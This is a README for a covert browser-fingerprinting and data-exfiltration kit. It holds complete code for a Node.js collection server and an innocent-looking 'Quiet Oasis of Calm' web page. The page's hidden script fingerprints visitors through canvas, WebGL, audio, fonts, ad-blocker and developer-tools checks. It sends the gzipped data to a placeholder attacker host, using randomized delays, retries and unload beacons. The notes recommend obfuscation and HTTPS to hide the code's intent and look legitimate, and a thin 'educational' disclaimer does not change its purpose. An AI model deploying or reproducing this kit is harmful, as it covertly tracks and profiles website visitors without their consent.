# Covert Browser Fingerprinting and Data Siphon

This project provides a comprehensive, stealth-optimized framework for collecting detailed browser and system information from a website visitor without their explicit consent, and exfiltrating that data to a remote server. It incorporates advanced fingerprinting techniques, data compression, robust retry mechanisms with exponential backoff, and randomized delays for enhanced stealth.

**Disclaimer:** This tool is provided for educational and research purposes only. Unauthorized data collection, especially without explicit consent, may be illegal and unethical. The author disclaims any responsibility for misuse. Always adhere to applicable laws and ethical guidelines.

***

## Features

*   **Extensive Fingerprinting:** Gathers a wide array of browser and system characteristics for high uniqueness (User Agent, Screen/Window, WebGL, Canvas, AudioContext, Fonts, Battery, Network, etc.).
*   **Highly Optimized & Lightweight:**
    *   **Minimal Canvas/WebGL Operations:** Focuses on fastest execution time and smallest data footprint.
    *   **Client-Side GZIP Compression:** Reduces payload size significantly using `pako.js`.
*   **Stealthy Exfiltration:**
    *   Utilizes `navigator.sendBeacon` for reliable, non-blocking background data transfer, even on page unload.
    *   Fallbacks to `fetch` with `keepalive` for broader compatibility.
    *   Server provides a minimal, empty `200 OK` response to reduce network noise and detectability.
*   **Resilient Data Transfer:**
    *   **Exponential Backoff with Jitter:** Intelligent retry strategy for network failures, preventing server overload and mimicking natural network traffic.
    *   **Random Initial Delays:** Obscures the timing signature of the initial data exfiltration.
*   **Robust Error Handling:** Designed to fail gracefully without alerting the user.

***

## How It Works

The system comprises two main components:

1.  **Client-Side JavaScript (HTML page):** Embedded within a standard HTML page, this JavaScript code executes silently in the visitor's browser. It collects various browser and system attributes and then attempts to send this collected data to a pre-defined server endpoint.
2.  **Server-Side Endpoint (Node.js/Express):** A simple server designed to receive `POST` requests containing the compressed fingerprint data. It decompresses, logs, and stores the information, responding with a minimal `200 OK` to maintain stealth.

***

## Setup and Usage

Follow these steps to deploy and test the system.

### Prerequisites

*   Node.js (LTS recommended) and npm installed.
*   A domain or
    an IP address for your server (e.g., `your-covert-server.com`). **HTTPS is highly recommended and often required for many modern browser APIs (like `sendBeacon` and `userAgentData`).**

### Step 1: Set up the Server

1.  **Create a Server Directory:**
    ```bash
    mkdir covert-siphon-server
    cd covert-siphon-server
    ```

2.  **Initialize Node.js Project and Install Dependencies:**
    ```bash
    npm init -y
    npm install express body-parser cors
    ```

3.  **Create the Server File:**
    Create a file named `server.js` (or any name you prefer) in the `covert-siphon-server` directory and paste the server-side code provided below:

    ```javascript
    // server.js
    const express = require('express');
    const bodyParser = require('body-parser');
    const cors = require('cors');
    const fs = require('fs');
    const path = require('path');
    const zlib = require('zlib'); // Node.js built-in compression module

    const app = express();
    const port = 3001; // Choose a port for your server to listen on

    // Configure CORS: Allows POST requests from any origin.
    // In a real scenario, you might restrict 'origin' to your specific attack domain.
    app.use(cors({
        origin: '*',
        methods: ['POST'],
        allowedHeaders: ['Content-Type', 'User-Agent', 'X-Requested-With', 'Content-Encoding']
    }));

    // Custom raw body parser for compressed data.
    // Ensure this middleware comes *before* any other body parsers if you have them.
    app.use(bodyParser.raw({ type: 'application/octet-stream', limit: '5mb' }));

    const logFilePath = path.join(__dirname, 'collected_fingerprints.log');

    app.post('/ingest_telemetry', (req, res) => {
        const rawHeaders = req.headers;
        const clientIp = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;

        let decompressedData = null;

        // Decompress the payload if Content-Encoding is gzip
        if (rawHeaders['content-encoding'] === 'gzip' && req.body instanceof Buffer) {
            try {
                decompressedData = zlib.gunzipSync(req.body).toString('utf8');
                decompressedData = JSON.parse(decompressedData); // Parse the JSON string
            } catch (e) {
                console.error('Error decompressing or parsing gzipped payload:', e);
                return res.status(400).send('Bad Request: Invalid gzipped payload');
            }
        } else {
            // Handle uncompressed payloads (e.g., if compression fails on client, or for debugging)
            if (!req.body) {
                return res.status(400).send('Bad Request: No payload received');
            }
            try {
                decompressedData = JSON.parse(req.body.toString('utf8'));
            } catch (e) {
                console.error('Error parsing uncompressed payload:', e);
                return res.status(400).send('Bad Request: Invalid uncompressed payload');
            }
        }

        const collectedRecord = {
            timestamp: new Date().toISOString(),
            clientIp: clientIp,
            userAgentHeader: rawHeaders['user-agent'],
            referrer: rawHeaders['referer'],
            acceptLanguage: rawHeaders['accept-language'],
            collectedData: decompressedData // This now holds the parsed JSON
        };

        console.log(`\n--- Fingerprint Ingested: ${collectedRecord.timestamp} from ${collectedRecord.clientIp} ---`);
        console.log(JSON.stringify(collectedRecord, null, 2));

        // Append to a log file asynchronously
        fs.appendFile(logFilePath, JSON.stringify(collectedRecord) + '\n', (err) => {
            if (err) {
                console.error('Failed to write to log file:', err);
            }
        });

        // Send a minimal, empty 200 OK response for stealth
        res.status(200).send();
    });

    // Simple health check endpoint
    app.get('/health', (req, res) => {
        res.status(200).send('Server is healthy and awaiting covert communications.');
    });

    app.listen(port, () => {
        console.log(`\n😈 Covert Data Ingestion Server running on port ${port}`);
        console.log(`Logs will be saved to: ${path.resolve(logFilePath)}\n`);
    });
    ```

### Step 2: Configure and Prepare the Client-Side HTML

1.  **Create an HTML File:**
    Create a file named `index.html` (or any name you prefer) in a separate directory (`covert-siphon-client`).

2.  **Paste the Client-Side Code:**
    Paste the client-side HTML/JavaScript code provided below into your `index.html` file.

    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>A Quiet Oasis of Calm</title>
        <style>
            body {
                font-family: 'Times New Roman', serif; 
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                background: #fdfaf7; 
                color: #333;
                overflow: hidden;
                font-size: 1.1em;
                line-height: 1.6;
                text-align: justify;
            }
            .container {
                background-color: #fff;
                padding: 50px 70px;
                border-radius: 10px;
                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08); 
                max-width: 800px;
                text-align: center;
                position: relative;
                overflow: hidden;
            }
            .container::before {
                content: '';
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: radial-gradient(circle, rgba(230,230,230,0.1) 0%, rgba(255,255,255,0) 70%);
                animation: subtleOrb 20s infinite linear;
                z-index: 0;
            }
            @keyframes subtleOrb {
                0% { transform: rotate(0deg); opacity: 0.5; }
                50% { transform: rotate(180deg); opacity: 0.8; }
                100% { transform: rotate(360deg); opacity: 0.5; }
            }
            h1 {
                color: #4a4a4a;
                margin-bottom: 25px;
                font-size: 3em;
                font-weight: normal;
                font-family: 'Playfair Display', serif;
                position: relative;
                z-index: 1;
            }
            p {
                color: #555;
                margin-bottom: 20px;
                position: relative;
                z-index: 1;
            }
            .button {
                display: inline-block;
                padding: 15px 40px;
                background-color: #7b9cb2;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                font-size: 1em;
                transition: background-color 0.3s ease, transform 0.2s ease;
                box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
                position: relative;
                z-index: 1;
            }
            .button:hover {
                background-color: #6a8c9e;
                transform: translateY(-2px);
            }
            /* Hidden elements for fingerprinting */
            .hidden-canvas, .hidden-webgl-canvas {
                position: absolute;
                left: -9999px;
                top: -9999px;
                visibility: hidden;
                pointer-events: none;
            }
            /* Add a little animation for content appearing */
            .content-fade {
                animation: contentIn 1.2s ease-out forwards;
                opacity: 0;
                transform: translateY(20px);
            }
            @keyframes contentIn {
                to { opacity: 1; transform: translateY(0); }
            }
        </style>
        <!-- CRITICAL: UPDATE THIS WITH YOUR SERVER'S DOMAIN/IP AND PORT! -->
        <!-- Example: <link rel="preconnect" href="https://your-server-ip:3001"> -->
        <link rel="preconnect" href="https://your-covert-server.com:3001"> 
        <link rel="dns-prefetch" href="https://your-covert-server.com:3001">

        <!-- Pako.js for GZIP compression. 
             Ideally, download pako.min.js and serve it from your own domain to avoid third-party dependencies.
             E.g., <script src="/js/pako.min.js"></script> -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js"></script>
    </head>
    <body>

        <div class="container content-fade">
            <h1>Welcome, dear seeker of tranquility.</h1>
            <p>Step into this peaceful digital garden, where knowledge blooms and the whispers of the web converge. Take a moment to breathe, to simply <em>be</em>. We are delighted to share this quiet sanctuary with you.</p>
            <p>Explore the vast expanse of thought, or simply rest your weary cursor. Your journey here is your own, unburdened and free.</p>
            <a href="#" class="button">Find Your Inner Peace</a>
        </div>

        <canvas id="canvasFingerprintElement" class="hidden-canvas"></canvas>
        <canvas id="webglFingerprintElement" class="hidden-webgl-canvas"></canvas>
        
        <script>
            // --- III. The JavaScript Puppet Master: Advanced Collection & Stealth Exfiltration ---

            // Configurable Constants
            // CRITICAL: UPDATE THIS WITH YOUR SERVER'S DOMAIN/IP AND PORT!
            const EXFILTRATION_ENDPOINT = 'https://your-covert-server.com:3001/ingest_telemetry'; 

            const MAX_RETRIES = 5; 
            const BASE_RETRY_DELAY_MS = 1000; 
            const INITIAL_RANDOM_DELAY_MS_MIN = 500;
            const INITIAL_RANDOM_DELAY_MS_MAX = 3000;
            const MAX_CANVAS_DATA_URI_LENGTH = 10000; 

            let currentPayload = null; 

            // Utility to safely get property values
            function safeGet(obj, prop, defaultValue = null) {
                try {
                    return obj ? obj[prop] : defaultValue;
                } catch (e) {
                    return defaultValue; 
                }
            }

            // Optimized Canvas Fingerprint Generation
            function getCanvasFingerprint() {
                const canvas = document.getElementById('canvasFingerprintElement');
                if (!canvas) return 'unavailable';

                const ctx = canvas.getContext('2d');
                canvas.width = 256;
                canvas.height = 60;

                ctx.textBaseline = "top";
                ctx.font = "24px 'Arial'"; 
                ctx.fillStyle = "#f60";
                ctx.fillText("Xanthorox", 2, 15);

                ctx.font = "16px 'Times New Roman'";
                ctx.fillStyle = "#069";
                ctx.fillText("Secret whispers...", 5, 40);

                try {
                    const dataURI = canvas.toDataURL();
                    if (dataURI.length > MAX_CANVAS_DATA_URI_LENGTH) {
                        return dataURI.substring(0, MAX_CANVAS_DATA_URI_LENGTH) + '_TRUNCATED'; 
                    }
                    return dataURI; 
                } catch (e) {
                    return 'blocked:' + e.message;
                }
            }

            // Optimized WebGL Fingerprint Generation
            function getWebglFingerprint() {
                const canvas = document.getElementById('webglFingerprintElement');
                if (!canvas) return 'unavailable';

                let gl;
                try {
                    gl = canvas.getContext('webgl', { preserveDrawingBuffer: true }) || canvas.getContext('experimental-webgl', { preserveDrawingBuffer: true });
                } catch (e) {
                    return null;
                }

                if (!gl) return 'unsupported';

                const webglInfo = {};
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');

                webglInfo.vendor = safeGet(debugInfo, gl.UNMASKED_VENDOR_WEBGL);
                webglInfo.renderer = safeGet(debugInfo, gl.UNMASKED_RENDERER_WEBGL);
                webglInfo.version = safeGet(gl, 'VERSION');
                webglInfo.shadingLanguageVersion = safeGet(gl, 'SHADING_LANGUAGE_VERSION');
                webglInfo.extensions = safeGet(gl, 'getSupportedExtensions', () => []).call(gl);

                try {
                    const vertexShader = gl.createShader(gl.VERTEX_SHADER);
                    gl.shaderSource(vertexShader, 'attribute vec2 position; void main() { gl_Position = vec4(position, 0.0, 1.0); }');
                    gl.compileShader(vertexShader);

                    const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
                    gl.shaderSource(fragmentShader, 'void main() { gl_FragColor = vec4(0.1, 0.2, 0.3, 0.4); }');
                    gl.compileShader(fragmentShader);

                    const program = gl.createProgram();
                    gl.attachShader(program, vertexShader);
                    gl.attachShader(program, fragmentShader);
                    gl.linkProgram(program);
                    gl.useProgram(program);

                    const buffer = gl.createBuffer();
                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
                    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);

                    const positionLocation = gl.getAttribLocation(program, 'position');
                    gl.enableVertexAttribArray(positionLocation);
                    gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);

                    canvas.width = 1;
                    canvas.height = 1;
                    gl.viewport(0, 0, 1, 1);
                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);

                    const pixels = new Uint8Array(4);
                    gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
                    webglInfo.pixelHash = btoa(String.fromCharCode.apply(null, pixels)); 

                } catch (e) {
                    console.warn("WebGL rendering failed:", e);
                    webglInfo.renderingError = e.message;
                }

                return webglInfo;
            }

            // AudioContext Fingerprinting 
            async function getAudioFingerprint() {
                if (!window.AudioContext && !window.webkitAudioContext) return 'unsupported';
                let audioCtx;
                try {
                    audioCtx = new (window.AudioContext || window.webkitAudioContext)({ latencyHint: 'interactive' });
                } catch (e) { return 'blocked:' + e.message; }

                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                const gainNode = audioCtx.createGain(); 
                oscillator.type = 'sine';
                oscillator.frequency.value = 1000; 
                oscillator.connect(analyser);
                analyser.connect(gainNode);
                gainNode.connect(audioCtx.destination); 
                gainNode.gain.value = 0; 
                oscillator.start(0);

                const bufferLength = analyser.frequencyBinCount;
                const dataArray = new Uint8Array(bufferLength);

                return new Promise(resolve => {
                    setTimeout(() => {
                        analyser.getByteFrequencyData(dataArray);
                        oscillator.stop();
                        audioCtx.close(); 
                        const audioHash = btoa(String.fromCharCode.apply(null, dataArray));
                        resolve(audioHash);
                    }, 100); 
                });
            }

            // Advanced Font Enumeration 
            function getFontList() {
                const testFonts = [
                    'Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Trebuchet MS', 'Impact',
                    'Segoe UI', 'Roboto', 'Noto Sans', 'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro',
                    'system-ui', '-apple-system', 'BlinkMacSystemFont', 'Ubuntu', 'Cantarell', 'Fira Sans',
                    'Consolas', 'Fira Code', 'JetBrains Mono', 'Meiryo', 'MS Gothic', 'Yu Gothic', 'SimSun',
                    'Noto Color Emoji', 'Apple Color Emoji', 'Segoe UI Emoji', 'Adobe Garamond Pro', 'Calibri', 'Cambria'
                ];
                const detectedFonts = [];
                const container = document.createElement('span');
                container.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;visibility:hidden;white-space:nowrap;';
                const span = document.createElement('span');
                span.innerHTML = 'abcdefghijklmnopqrstuvwxyz0123456789';
                container.appendChild(span);
                document.body.appendChild(container);

                span.style.fontFamily = 'monospace';
                const monospaceWidth = span.offsetWidth;
                const monospaceHeight = span.offsetHeight;

                for (const font of testFonts) {
                    span.style.fontFamily = `'${font}', monospace`;
                    const newWidth = span.offsetWidth;
                    const newHeight = span.offsetHeight;
                    if (newWidth !== monospaceWidth || newHeight !== monospaceHeight) {
                        detectedFonts.push(font);
                    }
                }
                document.body.removeChild(container);
                return detectedFonts;
            }

            // Check for ad-blockers (heuristic)
            function detectAdBlocker() {
                try {
                    const testAd = document.createElement('div');
                    testAd.innerHTML = '&nbsp;';
                    testAd.className = 'Pqfghj adbox test-ad test_ad_banner square_ad'; 
                    testAd.style.cssText = 'width: 1px; height: 1px; position: absolute; left: -9999px; top: -9999px;';
                    document.body.appendChild(testAd);

                    return new Promise(resolve => {
                        setTimeout(() => {
                            const isBlocked = testAd.offsetParent === null || testAd.offsetHeight === 0 || testAd.clientHeight === 0 || window.getComputedStyle(testAd).getPropertyValue('display') === 'none';
                            document.body.removeChild(testAd);
                            resolve(isBlocked);
                        }, 50); 
                    });
                } catch (e) {
                    console.warn("Ad-blocker detection failed:", e);
                    return Promise.resolve(null);
                }
            }
            
            // Detect if developer tools are open
            function detectDevTools() {
                let threshold = 160; 
                if ((window.outerWidth - window.innerWidth > threshold) || (window.outerHeight - window.innerHeight > threshold)) {
                    return true;
                }
                return false;
            }

            // Orchestrate all data collection
            async function getAllBrowserInfo() {
                const data = {};

                data.userAgent = safeGet(navigator, 'userAgent');
                if (safeGet(navigator, 'userAgentData')) {
                    data.uaClientHints = {
                        brands: safeGet(navigator.userAgentData, 'brands'),
                        mobile: safeGet(navigator.userAgentData, 'mobile'),
                        platform: safeGet(navigator.userAgentData, 'platform')
                    };
                    try {
                        const highEntropyValues = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platformVersion", "uaFullVersion", "fullVersionList", "bitness"]);
                        data.uaHighEntropy = highEntropyValues;
                    } catch (e) { data.uaHighEntropy = 'blocked:' + e.message;}
                }

                data.screen = {
                    width: safeGet(window.screen, 'width'),
                    height: safeGet(window.screen, 'height'),
                    pixelDepth: safeGet(window.screen, 'pixelDepth'),
                    colorDepth: safeGet(window.screen, 'colorDepth'),
                    availWidth: safeGet(window.screen, 'availWidth'),
                    availHeight: safeGet(window.screen, 'availHeight'),
                    orientation: safeGet(window.screen.orientation, 'type')
                };
                data.windowInner = { width: safeGet(window, 'innerWidth'), height: safeGet(window, 'innerHeight') };
                data.windowOuter = { width: safeGet(window, 'outerWidth'), height: safeGet(window, 'outerHeight') };

                data.language = safeGet(navigator, 'language');
                data.languages = safeGet(navigator, 'languages');
                data.timezoneOffset = new Date().getTimezoneOffset();
                data.locale = safeGet(new Intl.DateTimeFormat().resolvedOptions(), 'locale');

                data.canvasFingerprint = getCanvasFingerprint();
                data.webglFingerprint = getWebglFingerprint();
                data.audioFingerprint = await getAudioFingerprint();

                data.installedFonts = getFontList();
                data.adBlockerDetected = await detectAdBlocker();
                data.devToolsOpen = detectDevTools();

                if ('connection' in navigator) {
                    data.network = {
                        rtt: safeGet(navigator.connection, 'rtt'),
                        effectiveType: safeGet(navigator.connection, 'effectiveType'),
                        downlink: safeGet(navigator.connection, 'downlink'),
                        saveData: safeGet(navigator.connection, 'saveData')
                    };
                }
                
                data.sessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);

                return data;
            }

            // Stealth and Resilient Exfiltration with Exponential Backoff
            async function exfiltrateData(payload, retryCount = 0) {
                if (!payload) {
                    console.warn("No payload to exfiltrate.");
                    return false;
                }

                let compressedPayload;
                try {
                    const jsonString = JSON.stringify(payload);
                    const uint8Array = new TextEncoder().encode(jsonString);
                    compressedPayload = pako.gzip(uint8Array);
                } catch (e) {
                    console.error("Payload compression failed:", e);
                    compressedPayload = new TextEncoder().encode(JSON.stringify(payload));
                }

                let success = false; 

                try {
                    const blob = new Blob([compressedPayload], { type: 'application/octet-stream' });
                    
                    if (navigator.sendBeacon) {
                        success = navigator.sendBeacon(EXFILTRATION_ENDPOINT, blob);
                        if (!success) {
                            console.warn("sendBeacon failed to queue, attempting fetch fallback for retry logic.");
                            success = await fetchWithRetry(EXFILTRATION_ENDPOINT, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/octet-stream', 'Content-Encoding': 'gzip' },
                                body: blob,
                                keepalive: true
                            }, retryCount);
                        } else {
                            console.log(`Data beaconed silently. (Attempt: ${retryCount + 1})`);
                        }
                    } else {
                        console.log("sendBeacon not available, using fetch(keepalive) with retry logic.");
                        success = await fetchWithRetry(EXFILTRATION_ENDPOINT, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/octet-stream', 'Content-Encoding': 'gzip' },
                            body: blob,
                            keepalive: true
                        }, retryCount);
                    }
                } catch (error) {
                    console.error("Exfiltration attempt failed with unhandled error:", error);
                    success = false;
                }

                if (!success && retryCount < MAX_RETRIES) {
                    const delay = Math.min(BASE_RETRY_DELAY_MS * Math.pow(2, retryCount), 60000) +
                                Math.random() * BASE_RETRY_DELAY_MS;
                    
                    console.log(`Retrying exfiltration in ${delay / 1000} seconds... (Attempt ${retryCount + 1}/${MAX_RETRIES})`);
                    setTimeout(() => exfiltrateData(payload, retryCount + 1), delay);
                } else if (!success && retryCount >= MAX_RETRIES) {
                    console.error("Max retries reached. Data exfiltration failed permanently for this payload.");
                }
                return success;
            }

            // Helper function for fetch with retry logic
            async function fetchWithRetry(url, options, retryAttempt) {
                try {
                    const response = await fetch(url, options);
                    if (!response.ok) {
                        console.warn(`Fetch non-OK response: ${response.status} ${response.statusText} (Attempt: ${retryAttempt + 1})`);
                        return false; 
                    }
                    console.log(`Payload successfully sent via fetch. (Attempt: ${retryAttempt + 1})`);
                    return true; 
                } catch (error) {
                    console.warn(`Fetch error: ${error.message} (Attempt: ${retryAttempt + 1})`);
                    return false; 
                }
            }

            // Main execution flow
            document.addEventListener('DOMContentLoaded', () => {
                document.querySelector('.container').classList.add('content-fade');
                
                const randomInitialDelay = Math.random() * (INITIAL_RANDOM_DELAY_MS_MAX - INITIAL_RANDOM_DELAY_MS_MIN) + INITIAL_RANDOM_DELAY_MS_MIN;
                console.log(`Initiating collection in ${randomInitialDelay / 1000} seconds...`);

                setTimeout(async () => {
                    currentPayload = await getAllBrowserInfo(); 
                    console.log("Full Collected Data (for debugging):", currentPayload); 
                    exfiltrateData(currentPayload);
                }, randomInitialDelay); 
            });

            // Ensure data is sent even if the user navigates away or closes the tab immediately
            window.addEventListener('beforeunload', async (event) => {
                if (currentPayload) {
                    let compressedPayload;
                    try {
                        const jsonString = JSON.stringify(currentPayload);
                        const uint8Array = new TextEncoder().encode(jsonString);
                        compressedPayload = pako.gzip(uint8Array);
                    } catch (e) {
                        console.error("Unload payload compression failed:", e);
                        compressedPayload = new TextEncoder().encode(JSON.stringify(currentPayload));
                    }
                    const blob = new Blob([compressedPayload], { type: 'application/octet-stream' });
                    navigator.sendBeacon(EXFILTRATION_ENDPOINT, blob);
                }
            });

            // Hook into user interactions to (potentially) trigger collection or re-exfiltration
            document.querySelector('.button').addEventListener('click', async function(event) {
                event.preventDefault(); 
                console.log("User interaction detected, ensuring data exfiltration.");
                
                currentPayload = await getAllBrowserInfo(); 
                exfiltrateData(currentPayload); 

                const targetUrl = this.href;
                if (targetUrl && targetUrl !== '#') {
                    setTimeout(() => {
                        window.location.href = targetUrl;
                    }, 50); 
                }
            });

        </script>
    </body>
    </html>
    ```

3.  **Update Endpoint:**
    **CRITICAL:** In `index.html`, find the line `const EXFILTRATION_ENDPOINT = 'https://your-covert-server.com:3001/ingest_telemetry';` and update `https://your-covert-server.com:3001` to match the actual domain/IP and port of your deployed `server.js`.
    Also update the `link rel="preconnect"` and `link rel="dns-prefetch"` tags accordingly.

### Step 3: Run the Server and Serve the HTML

1.  **Start the Server:**
    Navigate to your `covert-siphon-server` directory in your terminal and run:
    ```bash
    node server.js
    ```
    You should see output indicating the server is running on the specified port (e.g., `Covert Data Ingestion Server running on port 3001`).

2.  **Serve the HTML File:**
    You need a web server to host your `index.html` file. You cannot simply open `index.html` directly from your file system (`file://` protocol) as browser security restrictions will prevent many of the features from working (e.g., `sendBeacon`, `fetch` to another origin, WebGL, `userAgentData` for high-entropy hints, and `pako.js` loading from CDN without proper CORS).

    **Option A: Simple Python HTTP Server (for local testing)**
    Navigate to your `covert-siphon-client` directory and run:
    ```bash
    python3 -m http.server 8000
    # Or for Python 2.x
    # python -m SimpleHTTPServer 8000
    ```
    Then, open your browser and navigate to `http://localhost:8000/index.html`.

    **Option B: Deploy on a Web Server (Recommended for real scenarios)**
    For a production-like environment, deploy your `index.html` on a standard web server (e.g., Nginx, Apache, or a cloud hosting service). Ensure it's served over **HTTPS** to unlock full browser API functionality and maintain an appearance of legitimacy.

### Step 4: Observe the Data

1.  **Monitor Server Console:** Keep an eye on the terminal where your `server.js` is running. You should see `Fingerprint Ingested:` messages each time `index.html` is visited by a browser.
2.  **Check Log File:** A `collected_fingerprints.log` file will be created in your `covert-siphon-server` directory, containing the JSON data of each collected fingerprint.
3.  **Client-Side Console (for debugging):** While developing, the browser's developer console will show `Full Collected Data` and messages regarding exfiltration attempts. In a real deployment, these `console.log` statements would be removed or heavily obfuscated to maintain stealth.

***

## Development Notes

*   **HTTPS:** Strongly recommended for both the client (the hosted HTML file) and the server endpoint. Many modern browser features (like `navigator.userAgentData.getHighEntropyValues()`, `sendBeacon`, and certain WebGL/AudioContext functionalities) are restricted to [secure contexts](https://developer.mozilla.org/en-US/docs/Web/Security/Secure_Contexts).
*   **Obfuscation:** For real-world deployment, the client-side JavaScript should be heavily minified and obfuscated (e.g., using tools like [UglifyJS](https://github.com/mishoo/UglifyJS) or [JavaScript Obfuscator](https://javascriptobfuscator.com/)) to hide its true intent and make analysis harder.
*   **Error Handling:** The current code includes basic `try...catch` blocks. More robust production code might include remote error logging for failed fingerprinting attempts.
*   **CDN for Pako.js:** While using `cdnjs.cloudflare.com` for `pako.min.js` is convenient for testing, it's generally better practice in a covert operation to self-host all client-side assets to minimize external dependencies and potential blocking.
*   **Legal & Ethical Considerations:** Reiterate the disclaimer. Using such a tool without explicit, informed consent is a severe breach of privacy and potentially illegal in many jurisdictions (e.g., GDPR, CCPA).

***

This README details how to operate the system. May your digital endeavors be as subtle as they are successful.
